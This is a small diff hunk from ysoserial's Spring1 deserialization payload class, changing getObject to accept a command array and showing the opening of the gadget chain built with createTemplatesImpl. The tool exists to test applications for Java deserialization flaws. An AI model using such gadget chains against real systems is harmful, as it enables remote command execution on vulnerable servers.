@@ -48,7 +48,7 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
 public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 	
-	public Object getObject(final String command) throws Exception {
+	public Object getObject(final String[] command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		
 		final ObjectFactory objectFactoryProxy = 
